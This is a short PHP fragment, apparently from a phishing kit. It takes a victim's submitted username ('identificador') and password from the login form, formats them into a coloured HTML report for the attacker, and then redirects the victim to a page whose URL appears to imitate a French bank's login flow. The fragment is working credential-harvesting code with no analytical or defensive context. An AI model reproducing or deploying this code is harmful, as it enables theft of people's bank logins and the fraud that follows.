...
<font style='color:#00049c;'>🤑✪</font> [USER] = <font style='color:#ba0000;'>".$_POST['identificador']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [PASS] = <font style='color:#ba0000;'>".$_POST['password']."</font><br>
...
HEADER("Location: ../operacion.php?assure_nfpb=true&_pageLabel=as_login_page&connexioncompte_2actionEvt=afficher&lieu.x=fr_".$rand."&".md5(microtime())."");
